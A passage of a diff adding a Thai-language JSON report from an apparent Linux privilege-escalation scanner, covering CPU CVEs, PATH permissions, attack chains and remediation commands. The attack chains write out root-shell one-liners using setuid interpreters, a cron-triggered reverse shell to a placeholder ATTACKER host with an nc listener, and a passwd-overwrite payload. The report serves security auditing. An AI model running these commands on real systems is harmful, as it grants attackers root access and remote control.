+            "thai_mitigation": "1. \u0e2d\u0e31\u0e1b\u0e40\u0e14\u0e15 Kernel \u0e41\u0e25\u0e30\u0e40\u0e1b\u0e34\u0e14 Mitigation (IBRS, IBPB, STIBP):\n        grep . /sys/devices/system/cpu/vulnerabilities/*\n     2. \u0e2d\u0e31\u0e1b\u0e40\u0e14\u0e15 CPU Microcode (intel-microcode / amd64-microcode)\n     3. \u0e40\u0e1b\u0e34\u0e14 Retpoline Compiler Mitigation (\u0e04\u0e48\u0e32 Default \u0e1a\u0e19 Kernel \u0e43\u0e2b\u0e21\u0e48)\n     4. \u0e1a\u0e19 VM/Cloud: \u0e43\u0e0a\u0e49 CPU \u0e17\u0e35\u0e48\u0e23\u0e2d\u0e07\u0e23\u0e31\u0e1a Enhanced IBRS\n     5. \u0e22\u0e2d\u0e21\u0e23\u0e31\u0e1a\u0e27\u0e48\u0e32\u0e2d\u0e32\u0e08\u0e21\u0e35\u0e1c\u0e25\u0e15\u0e48\u0e2d Performance 5-30% \u0e1a\u0e19 Workload \u0e1a\u0e32\u0e07\u0e1b\u0e23\u0e30\u0e40\u0e20\u0e17"
+        },
+        {
+            "cve": "CVE-2017-5754",
+            "name": "Meltdown",
+            "category": "CPU Speculative",
+            "severity": "MEDIUM",
+            "cvss": 5.6,
+            "description": "Rogue data cache load via speculative execution allows kernel memory read from userspace.",
+            "status": "UNKNOWN",
+            "backport_detected": null,
+            "kpatch_detected": false,
+            "note": "",
+            "thai_detail": "\u0e0a\u0e48\u0e2d\u0e07\u0e42\u0e2b\u0e27\u0e48 Meltdown \u0e23\u0e38\u0e19\u0e41\u0e23\u0e07\u0e01\u0e27\u0e48\u0e32 Spectre v1 \u0e40\u0e1e\u0e23\u0e32\u0e30\u0e2d\u0e19\u0e38\u0e0d\u0e32\u0e15\u0e43\u0e2b\u0e49\n     Userspace Process \u0e2d\u0e48\u0e32\u0e19 Kernel Memory \u0e44\u0e14\u0e49\u0e42\u0e14\u0e22\u0e15\u0e23\u0e07\n     \u0e43\u0e0a\u0e49 Speculative Execution \u0e17\u0e35\u0e48 CPU \u0e17\u0e33\u0e01\u0e48\u0e2d\u0e19\u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a Permission\n     \u0e02\u0e49\u0e2d\u0e21\u0e39\u0e25\u0e17\u0e35\u0e48\u0e23\u0e31\u0e48\u0e27\u0e44\u0e14\u0e49 \u0e40\u0e0a\u0e48\u0e19 Kernel Stack, Password Hash, Private Key\n     \u0e41\u0e01\u0e49\u0e44\u0e02\u0e14\u0e49\u0e27\u0e22 KPTI (Kernel Page-Table Isolation) \u0e0b\u0e36\u0e48\u0e07\u0e2d\u0e32\u0e08\u0e25\u0e14 Performance",
+            "thai_mitigation": "1. \u0e2d\u0e31\u0e1b\u0e40\u0e14\u0e15 Kernel \u0e40\u0e1b\u0e47\u0e19 4.15+ \u0e17\u0e35\u0e48\u0e21\u0e35 KPTI (PTI) \u0e40\u0e1b\u0e34\u0e14\u0e2d\u0e22\u0e39\u0e48\n        \u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a: cat /sys/devices/system/cpu/vulnerabilities/meltdown\n     2. \u0e2d\u0e31\u0e1b\u0e40\u0e14\u0e15 CPU Microcode \u0e43\u0e2b\u0e49\u0e40\u0e1b\u0e47\u0e19\u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e0a\u0e31\u0e19\u0e25\u0e48\u0e32\u0e2a\u0e38\u0e14\n     3. \u0e1a\u0e19 VM: \u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a\u0e27\u0e48\u0e32 Hypervisor \u0e23\u0e2d\u0e07\u0e23\u0e31\u0e1a Mitigation \u0e41\u0e25\u0e49\u0e27\u0e2b\u0e23\u0e37\u0e2d\u0e22\u0e31\u0e07\n     4. \u0e1b\u0e34\u0e14 Hyperthreading \u0e16\u0e49\u0e32\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e32\u0e23\u0e04\u0e27\u0e32\u0e21\u0e1b\u0e25\u0e2d\u0e14\u0e20\u0e31\u0e22\u0e2a\u0e39\u0e07\u0e2a\u0e38\u0e14 (\u0e25\u0e14 Performance ~50%)\n     5. \u0e43\u0e0a\u0e49 Hardware \u0e23\u0e38\u0e48\u0e19\u0e43\u0e2b\u0e21\u0e48\u0e17\u0e35\u0e48 Fix \u0e0a\u0e48\u0e2d\u0e07\u0e42\u0e2b\u0e27\u0e48\u0e43\u0e19 Silicon \u0e42\u0e14\u0e22\u0e15\u0e23\u0e07"
+        }
+    ],
+    "checks": {
+        "log_permission": {
+            "vulnerable": false,
+            "detail": null
+        },
+        "symlink_check": {
+            "vulnerable": false,
+            "detail": null
+        },
+        "sgid_check": {
+            "vulnerable": true,
+            "detail": "/usr/bin/crontab"
+        },
+        "tmp_sticky": {
+            "vulnerable": false,
+            "detail": null
+        },
+        "env_injection": {
+            "vulnerable": false,
+            "detail": null
+        },
+        "sudo_in_crontab": {
+            "vulnerable": false,
+            "detail": null
+        },
+        "writable_scripts": {
+            "vulnerable": false,
+            "detail": null
+        }
+    },
+    "cve_correlations": [
+        {
+            "cve": "CVE-2017-7308",
+            "name": "AF_PACKET via Writable PATH Escalation",
+            "category": "Network / PATH",
+            "description": "AF_PACKET socket combined with world-writable PATH directories allows crafting race conditions for privilege escalation.",
+            "description_th": "AF_PACKET socket \u0e40\u0e21\u0e37\u0e48\u0e2d\u0e43\u0e0a\u0e49\u0e23\u0e48\u0e27\u0e21\u0e01\u0e31\u0e1a world-writable PATH directory \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e2a\u0e23\u0e49\u0e32\u0e07 race condition \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e22\u0e01\u0e23\u0e30\u0e14\u0e31\u0e1a\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e44\u0e14\u0e49",
+            "impact_th": "\u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e17\u0e35\u0e48\u0e21\u0e35\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e2a\u0e23\u0e49\u0e32\u0e07 AF_PACKET socket (\u0e2b\u0e23\u0e37\u0e2d\u0e1c\u0e48\u0e32\u0e19 cap_net_raw) \u0e23\u0e48\u0e27\u0e21\u0e01\u0e31\u0e1a PATH directory \u0e17\u0e35\u0e48\u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e14\u0e49 \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16 trigger race condition \u0e43\u0e19 kernel network stack \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e44\u0e14\u0e49 root",
+            "cvss": 7.8,
+            "severity": "HIGH",
+            "remediation": "Upgrade kernel >= 4.10.6. Restrict raw socket capabilities.",
+            "prevention_th": [
+                "\u0e2d\u0e31\u0e1b\u0e40\u0e01\u0e23\u0e14 kernel \u0e40\u0e1b\u0e47\u0e19\u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e0a\u0e31\u0e19 4.10.6 \u0e02\u0e36\u0e49\u0e19\u0e44\u0e1b",
+                "\u0e08\u0e33\u0e01\u0e31\u0e14\u0e01\u0e32\u0e23\u0e2a\u0e23\u0e49\u0e32\u0e07 AF_PACKET socket: sysctl -w net.core.bpf_jit_harden=2",
+                "\u0e25\u0e1a world-writable directory \u0e2d\u0e2d\u0e01\u0e08\u0e32\u0e01 PATH \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e15\u0e31\u0e14 attack vector",
+                "\u0e08\u0e33\u0e01\u0e31\u0e14 cap_net_raw \u0e44\u0e21\u0e48\u0e43\u0e2b\u0e49\u0e21\u0e2d\u0e1a\u0e43\u0e2b\u0e49 process \u0e17\u0e35\u0e48\u0e44\u0e21\u0e48\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19",
+                "\u0e43\u0e0a\u0e49 seccomp profile \u0e40\u0e1e\u0e37\u0e48\u0e2d block socket(AF_PACKET) syscall \u0e2a\u0e33\u0e2b\u0e23\u0e31\u0e1a process \u0e17\u0e31\u0e48\u0e27\u0e44\u0e1b"
+            ],
+            "matched_reasons": [
+                "World-writable PATH directory detected"
+            ]
+        },
+        {
+            "cve": "CVE-2015-1318",
+            "name": "OverlayFS Local Privilege Escalation",
+            "category": "Filesystem / PATH",
+            "description": "Ubuntu OverlayFS allows unprivileged users to mount overlayfs on arbitrary paths, combined with PATH hijack to escalate privileges.",
+            "description_th": "Ubuntu \u0e2d\u0e19\u0e38\u0e0d\u0e32\u0e15\u0e43\u0e2b\u0e49\u0e1c\u0e39\u0e49\u0e43\u0e0a\u0e49\u0e17\u0e31\u0e48\u0e27\u0e44\u0e1b mount overlayfs \u0e1a\u0e19 path \u0e43\u0e14\u0e01\u0e47\u0e44\u0e14\u0e49 \u0e40\u0e21\u0e37\u0e48\u0e2d\u0e43\u0e0a\u0e49\u0e23\u0e48\u0e27\u0e21\u0e01\u0e31\u0e1a PATH hijack \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e22\u0e01\u0e23\u0e30\u0e14\u0e31\u0e1a\u0e2a\u0e34\u0e17\u0e18\u0e34\u0e4c\u0e44\u0e14\u0e49",
+            "impact_th": "\u0e1c\u0e39\u0e49\u0e42\u0e08\u0e21\u0e15\u0e35\u0e2a\u0e23\u0e49\u0e32\u0e07 overlayfs layer \u0e17\u0e35\u0e48\u0e0b\u0e49\u0e2d\u0e19\u0e17\u0e31\u0e1a /bin \u0e2b\u0e23\u0e37\u0e2d /usr/bin \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49 binary \u0e17\u0e35\u0e48\u0e15\u0e31\u0e27\u0e40\u0e2d\u0e07\u0e04\u0e27\u0e1a\u0e04\u0e38\u0e21\u0e16\u0e39\u0e01\u0e23\u0e31\u0e19\u0e41\u0e17\u0e19 binary \u0e08\u0e23\u0e34\u0e07 \u0e40\u0e21\u0e37\u0e48\u0e2d\u0e21\u0e35 world-writable PATH directory \u0e23\u0e48\u0e27\u0e21\u0e14\u0e49\u0e27\u0e22\u0e08\u0e30 exploit \u0e44\u0e14\u0e49\u0e07\u0e48\u0e32\u0e22\u0e02\u0e36\u0e49\u0e19",
+            "cvss": 6.5,
+            "severity": "MEDIUM",
+            "remediation": "Upgrade kernel. Restrict user namespaces: sysctl -w kernel.unprivileged_userns_clone=0",
+            "prevention_th": [
+                "\u0e2d\u0e31\u0e1b\u0e40\u0e01\u0e23\u0e14 kernel \u0e40\u0e1b\u0e47\u0e19\u0e40\u0e27\u0e2d\u0e23\u0e4c\u0e0a\u0e31\u0e19\u0e17\u0e35\u0e48\u0e44\u0e14\u0e49\u0e23\u0e31\u0e1a\u0e01\u0e32\u0e23 patch \u0e41\u0e25\u0e49\u0e27",
+                "\u0e1b\u0e34\u0e14 unprivileged user namespace: sysctl -w kernel.unprivileged_userns_clone=0",
+                "\u0e17\u0e33\u0e43\u0e2b\u0e49\u0e04\u0e48\u0e32\u0e19\u0e35\u0e49\u0e04\u0e07\u0e2d\u0e22\u0e39\u0e48\u0e2b\u0e25\u0e31\u0e07 reboot: echo 'kernel.unprivileged_userns_clone=0' >> /etc/sysctl.conf",
+                "\u0e25\u0e1a world-writable directory \u0e2d\u0e2d\u0e01\u0e08\u0e32\u0e01 PATH \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e25\u0e14 attack surface"
+            ],
+            "matched_reasons": [
+                "World-writable PATH directory detected"
+            ]
+        }
+    ],
+    "path_analysis": [
+        {
+            "directory": "/mnt/c/Users/X390/Desktop/test/.venv/bin",
+            "order": 1,
+            "exists": true,
+            "relative": false,
+            "world_writable": true,
+            "owner": "ubuntu",
+            "risk": "HIGH",
+            "issues": [
+                "World-writable",
+                "Appears early in PATH (position #1)"
+            ]
+        },
+        {
+            "directory": "/usr/local/sbin",
+            "order": 2,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "root",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/usr/local/bin",
+            "order": 3,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "root",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/usr/sbin",
+            "order": 4,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "root",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/usr/bin",
+            "order": 5,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "root",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/sbin",
+            "order": 6,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "root",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/bin",
+            "order": 7,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "root",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/usr/games",
+            "order": 8,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "root",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/usr/local/games",
+            "order": 9,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "root",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/mnt/c/Program Files (x86)/VMware/VMware Workstation/bin/",
+            "order": 10,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "ubuntu",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/mnt/c/Windows/system32",
+            "order": 11,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "ubuntu",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/mnt/c/Windows",
+            "order": 12,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "ubuntu",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/mnt/c/Windows/System32/Wbem",
+            "order": 13,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "ubuntu",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/mnt/c/Windows/System32/WindowsPowerShell/v1.0/",
+            "order": 14,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "ubuntu",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/mnt/c/Windows/System32/OpenSSH/",
+            "order": 15,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "ubuntu",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/mnt/c/Program Files/Git/cmd",
+            "order": 16,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "ubuntu",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/mnt/c/Program Files/nodejs/",
+            "order": 17,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "ubuntu",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/mnt/c/Users/X390/AppData/Local/Python/bin",
+            "order": 18,
+            "exists": true,
+            "relative": false,
+            "world_writable": true,
+            "owner": "ubuntu",
+            "risk": "HIGH",
+            "issues": [
+                "World-writable"
+            ]
+        },
+        {
+            "directory": "/mnt/c/msys64/ucrt64/bin",
+            "order": 19,
+            "exists": true,
+            "relative": false,
+            "world_writable": true,
+            "owner": "ubuntu",
+            "risk": "HIGH",
+            "issues": [
+                "World-writable"
+            ]
+        },
+        {
+            "directory": "/mnt/c/Program Files/PuTTY/",
+            "order": 20,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "ubuntu",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/mnt/c/Program Files/Cloudflare/Cloudflare WARP/",
+            "order": 21,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "ubuntu",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/mnt/c/Program Files/Docker/Docker/resources/bin",
+            "order": 22,
+            "exists": true,
+            "relative": false,
+            "world_writable": false,
+            "owner": "ubuntu",
+            "risk": "OK",
+            "issues": []
+        },
+        {
+            "directory": "/mnt/c/Users/X390/scoop/shims",
+            "order": 23,
+            "exists": true,
+            "relative": false,
+            "world_writable": true,
+            "owner": "ubuntu",
+            "risk": "HIGH",
+            "issues": [
+                "World-writable"
+            ]
+        },
+        {
+            "directory": "/mnt/c/Users/X390/AppData/Local/Microsoft/WindowsApps",
+            "order": 24,
+            "exists": true,
+            "relative": false,
+            "world_writable": true,
+            "owner": "ubuntu",
+            "risk": "HIGH",
+            "issues": [
+                "World-writable"
+            ]
+        },
+        {
+            "directory": "/mnt/c/Users/X390/AppData/Local/Programs/Microsoft VS Code/bin",
+            "order": 25,
+            "exists": true,
+            "relative": false,
+            "world_writable": true,
+            "owner": "ubuntu",
+            "risk": "HIGH",
+            "issues": [
+                "World-writable"
+            ]
+        },
+        {
+            "directory": "/mnt/c/Users/X390/AppData/Roaming/npm",
+            "order": 26,
+            "exists": true,
+            "relative": false,
+            "world_writable": true,
+            "owner": "ubuntu",
+            "risk": "HIGH",
+            "issues": [
+                "World-writable"
+            ]
+        },
+        {
+            "directory": "/mnt/c/Users/X390/AppData/Local/Python/bin",
+            "order": 27,
+            "exists": true,
+            "relative": false,
+            "world_writable": true,
+            "owner": "ubuntu",
+            "risk": "HIGH",
+            "issues": [
+                "World-writable"
+            ]
+        },
+        {
+            "directory": "/mnt/c/users/x390/.local/bin",
+            "order": 28,
+            "exists": true,
+            "relative": false,
+            "world_writable": true,
+            "owner": "ubuntu",
+            "risk": "HIGH",
+            "issues": [
+                "World-writable"
+            ]
+        },
+        {
+            "directory": "/snap/bin",
+            "order": 29,
+            "exists": false,
+            "relative": false,
+            "world_writable": false,
+            "owner": "N/A",
+            "risk": "MEDIUM",
+            "issues": [
+                "Directory does not exist \u2014 phantom PATH entry"
+            ]
+        }
+    ],
+    "attack_chains": [
+        {
+            "id": "CHAIN-003",
+            "name": "Dangerous Capability on Interpreter",
+            "name_th": "Interpreter (python/perl/ruby) \u0e21\u0e35 cap_setuid",
+            "description_th": "Python, Perl, Ruby \u0e2b\u0e23\u0e37\u0e2d Node \u0e21\u0e35 cap_setuid \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e23\u0e31\u0e19 one-liner \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e1b\u0e47\u0e19 root \u0e44\u0e14\u0e49\u0e17\u0e31\u0e19\u0e17\u0e35\u0e42\u0e14\u0e22\u0e44\u0e21\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e23\u0e2d",
+            "severity": "CRITICAL",
+            "confidence": 99,
+            "mitre": "T1548.001",
+            "steps_th": [
+                "\u0e22\u0e37\u0e19\u0e22\u0e31\u0e19 capability: getcap <binary_path>",
+                "Python: <binary> -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+                "Perl:   <binary> -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/bash\";'",
+                "Ruby:   <binary> -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'",
+                "\u2192  ROOT SHELL \u0e17\u0e31\u0e19\u0e17\u0e35"
+            ],
+            "sources_used": [
+                "caps"
+            ],
+            "evidence_summary": {
+                "caps": [
+                    "/usr/bin/python3.11",
+                    "/usr/bin/node",
+                    "/usr/bin/perl"
+                ]
+            }
+        },
+        {
+            "id": "CHAIN-002",
+            "name": "Writable PATH Dir + Cron Command Hijack",
+            "name_th": "PATH Directory \u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e14\u0e49 + Cron \u0e43\u0e0a\u0e49 relative command",
+            "description_th": "\u0e21\u0e35 directory \u0e43\u0e19 PATH \u0e17\u0e35\u0e48\u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e14\u0e49 \u0e41\u0e25\u0e30 cron job \u0e40\u0e23\u0e35\u0e22\u0e01 command \u0e42\u0e14\u0e22\u0e44\u0e21\u0e48\u0e23\u0e30\u0e1a\u0e38 absolute path \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e27\u0e32\u0e07 binary \u0e1b\u0e25\u0e2d\u0e21\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49 cron \u0e23\u0e31\u0e19\u0e41\u0e17\u0e19",
+            "severity": "CRITICAL",
+            "confidence": 90,
+            "mitre": "T1574.007",
+            "steps_th": [
+                "\u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a PATH: echo $PATH  \u0e41\u0e25\u0e49\u0e27\u0e14\u0e39\u0e41\u0e15\u0e48\u0e25\u0e30 dir \u0e14\u0e49\u0e27\u0e22 ls -ld",
+                "\u0e04\u0e49\u0e19\u0e2b\u0e32 cron command \u0e17\u0e35\u0e48\u0e44\u0e21\u0e48\u0e21\u0e35 / \u0e19\u0e33\u0e2b\u0e19\u0e49\u0e32: grep -r '' /etc/cron.* | grep -v '/'",
+                "\u0e2a\u0e23\u0e49\u0e32\u0e07 binary \u0e1b\u0e25\u0e2d\u0e21\u0e43\u0e19 writable PATH dir: echo -e '#!/bin/bash\\nchmod +s /bin/bash' > /tmp/<cmd> && chmod +x /tmp/<cmd>",
+                "\u0e23\u0e2d cron \u0e23\u0e31\u0e19  \u2192  /bin/bash -p  \u2192  ROOT SHELL"
+            ],
+            "sources_used": [
+                "path",
+                "cron"
+            ],
+            "evidence_summary": {
+                "path": [
+                    "",
+                    "",
+                    ""
+                ],
+                "cron": [
+                    "CVE-2017-9525"
+                ]
+            }
+        },
+        {
+            "id": "CHAIN-001",
+            "name": "Cron Job + Writable Script Execution",
+            "name_th": "Cron Job \u0e23\u0e31\u0e19 script \u0e17\u0e35\u0e48\u0e40\u0e02\u0e35\u0e22\u0e19\u0e17\u0e31\u0e1a\u0e44\u0e14\u0e49",
+            "description_th": "Cron job \u0e23\u0e31\u0e19\u0e40\u0e1b\u0e47\u0e19 root \u0e41\u0e15\u0e48 script \u0e17\u0e35\u0e48\u0e16\u0e39\u0e01\u0e40\u0e23\u0e35\u0e22\u0e01\u0e2d\u0e22\u0e39\u0e48\u0e43\u0e19 directory \u0e17\u0e35\u0e48\u0e17\u0e38\u0e01\u0e04\u0e19\u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e14\u0e49 \u0e17\u0e33\u0e43\u0e2b\u0e49\u0e1d\u0e31\u0e07 command \u0e40\u0e02\u0e49\u0e32\u0e44\u0e1b\u0e41\u0e25\u0e49\u0e27\u0e23\u0e2d cron \u0e23\u0e31\u0e19",
+            "severity": "CRITICAL",
+            "confidence": 75,
+            "mitre": "T1053.003",
+            "steps_th": [
+                "\u0e15\u0e23\u0e27\u0e08\u0e2b\u0e32 cron job \u0e17\u0e35\u0e48\u0e23\u0e31\u0e19\u0e40\u0e1b\u0e47\u0e19 root: crontab -l && ls -la /etc/cron.*",
+                "\u0e22\u0e37\u0e19\u0e22\u0e31\u0e19\u0e27\u0e48\u0e32 script \u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e14\u0e49: ls -la <script_path>",
+                "\u0e1d\u0e31\u0e07 reverse shell: echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> <script>",
+                "\u0e23\u0e2d cron \u0e17\u0e33\u0e07\u0e32\u0e19\u0e15\u0e32\u0e21\u0e15\u0e32\u0e23\u0e32\u0e07",
+                "\u0e23\u0e31\u0e1a shell: nc -lvnp 4444  \u2192  ROOT SHELL"
+            ],
+            "sources_used": [
+                "cron"
+            ],
+            "evidence_summary": {
+                "cron": [
+                    "CVE-2017-9525"
+                ]
+            }
+        },
+        {
+            "id": "CHAIN-007",
+            "name": "cap_dac_override + Overwrite SUID Binary",
+            "name_th": "cap_dac_override \u0e43\u0e0a\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19\u0e17\u0e31\u0e1a SUID binary",
+            "description_th": "Binary \u0e17\u0e35\u0e48\u0e21\u0e35 cap_dac_override \u0e02\u0e49\u0e32\u0e21 permission check \u0e17\u0e38\u0e01\u0e2d\u0e22\u0e48\u0e32\u0e07 \u0e43\u0e0a\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19\u0e17\u0e31\u0e1a SUID binary (\u0e40\u0e0a\u0e48\u0e19 /usr/bin/passwd) \u0e14\u0e49\u0e27\u0e22 payload",
+            "severity": "CRITICAL",
+            "confidence": 67,
+            "mitre": "T1574.010",
+            "steps_th": [
+                "\u0e22\u0e37\u0e19\u0e22\u0e31\u0e19 cap_dac_override: getcap <binary>",
+                "\u0e2b\u0e32 SUID binary \u0e40\u0e1b\u0e49\u0e32\u0e2b\u0e21\u0e32\u0e22: find / -perm -4000 2>/dev/null",
+                "\u0e2a\u0e23\u0e49\u0e32\u0e07 payload: echo -e '#!/bin/bash\\nbash -p' > /tmp/payload && chmod +x /tmp/payload",
+                "\u0e40\u0e02\u0e35\u0e22\u0e19\u0e17\u0e31\u0e1a SUID: <cap_binary> cp /tmp/payload /usr/bin/passwd",
+                "\u0e23\u0e31\u0e19 /usr/bin/passwd  \u2192  ROOT SHELL"
+            ],
+            "sources_used": [
+                "caps"
+            ],
+            "evidence_summary": {
+                "caps": [
+                    "/usr/bin/perl",
+                    "/usr/bin/vim.basic"
+                ]
+            }
+        }
+    ],
+    "remediation_roadmap": [
+        {
+            "key": "cap_setuid_interpreter",
+            "title": "\u0e25\u0e1a cap_setuid \u0e2d\u0e2d\u0e01\u0e08\u0e32\u0e01 Interpreter",
+            "description_th": "\u0e25\u0e1a cap_setuid/cap_sys_admin \u0e2d\u0e2d\u0e01\u0e08\u0e32\u0e01 scripting interpreter \u0e17\u0e38\u0e01\u0e15\u0e31\u0e27 \u0e40\u0e1e\u0e23\u0e32\u0e30\u0e40\u0e1b\u0e47\u0e19 one-shot privesc",
+            "effort": "LOW",
+            "impact": "CRITICAL",
+            "timeline": "immediate",
+            "commands": [
+                "# \u0e15\u0e23\u0e27\u0e08\u0e2a\u0e2d\u0e1a\u0e01\u0e48\u0e2d\u0e19",
+                "getcap -r / 2>/dev/null | grep -E 'python|perl|ruby|node'",
+                "# \u0e25\u0e1a capability",
+                "setcap -r /usr/bin/python3  # \u0e1b\u0e23\u0e31\u0e1a path \u0e15\u0e32\u0e21\u0e17\u0e35\u0e48\u0e1e\u0e1a",
+                "setcap -r /usr/bin/perl",
+                "# \u0e22\u0e37\u0e19\u0e22\u0e31\u0e19\u0e1c\u0e25",
+                "getcap /usr/bin/python3   # \u0e15\u0e49\u0e2d\u0e07\u0e44\u0e21\u0e48\u0e21\u0e35 output"
+            ],
+            "verify": "getcap -r / 2>/dev/null | grep -E 'setuid|sys_admin'",
+            "breaks_chains": [
+                "CHAIN-003"
+            ],
+            "trigger_score": 10.0,
+            "trigger_finding": "/usr/bin/python3.11"
+        },
+        {
+            "key": "cap_sys_admin",
+            "title": "\u0e25\u0e1a cap_sys_admin \u0e2d\u0e2d\u0e01\u0e08\u0e32\u0e01 binary",
+            "description_th": "cap_sys_admin \u0e40\u0e17\u0e35\u0e22\u0e1a\u0e40\u0e17\u0e48\u0e32 root \u0e15\u0e49\u0e2d\u0e07\u0e25\u0e1a\u0e2d\u0e2d\u0e01\u0e17\u0e31\u0e19\u0e17\u0e35 \u0e44\u0e21\u0e48\u0e21\u0e35\u0e01\u0e23\u0e13\u0e35\u0e43\u0e14\u0e17\u0e35\u0e48\u0e04\u0e27\u0e23\u0e43\u0e2b\u0e49 binary \u0e17\u0e31\u0e48\u0e27\u0e44\u0e1b\u0e21\u0e35 capability \u0e19\u0e35\u0e49",
+            "effort": "LOW",
+            "impact": "CRITICAL",
+            "timeline": "immediate",
+            "commands": [
+                "# \u0e04\u0e49\u0e19\u0e2b\u0e32 binary \u0e17\u0e35\u0e48\u0e21\u0e35 cap_sys_admin",
+                "getcap -r / 2>/dev/null | grep sys_admin",
+                "# \u0e25\u0e1a\u0e2d\u0e2d\u0e01",
+                "setcap -r <binary_path>",
+                "# \u0e16\u0e49\u0e32\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e49\u0e2d\u0e07\u0e43\u0e0a\u0e49 \u0e43\u0e2b\u0e49\u0e43\u0e0a\u0e49 systemd service restriction \u0e41\u0e17\u0e19",
+                "# \u0e43\u0e19 unit file: AmbientCapabilities=CAP_NET_ADMIN  (\u0e23\u0e30\u0e1a\u0e38\u0e40\u0e09\u0e1e\u0e32\u0e30\u0e17\u0e35\u0e48\u0e15\u0e49\u0e2d\u0e07\u0e01\u0e32\u0e23)"
+            ],
+            "verify": "getcap -r / 2>/dev/null | grep sys_admin  # \u0e15\u0e49\u0e2d\u0e07\u0e44\u0e21\u0e48\u0e21\u0e35 output",
+            "breaks_chains": [
+                "CHAIN-003",
+                "CHAIN-007"
+            ],
+            "trigger_score": 10.0,
+            "trigger_finding": "/usr/local/bin/custom_tool"
+        },
+        {
+            "key": "cron_writable_script",
+            "title": "\u0e41\u0e01\u0e49\u0e44\u0e02 Permission \u0e02\u0e2d\u0e07 Cron Script",
+            "description_th": "\u0e17\u0e38\u0e01 script \u0e17\u0e35\u0e48 cron \u0e23\u0e31\u0e19\u0e40\u0e1b\u0e47\u0e19 root \u0e15\u0e49\u0e2d\u0e07 owned \u0e42\u0e14\u0e22 root \u0e41\u0e25\u0e30\u0e40\u0e02\u0e35\u0e22\u0e19\u0e44\u0e14\u0e49\u0e40\u0e09\u0e1e\u0e32\u0e30 root \u0e40\u0e17\u0e48\u0e32\u0e19\u0e31\u0e49\u0e19",
+            "effort": "LOW",
+            "impact": "CRITICAL",
+            "timeline": "immediate",
+            "commands": [
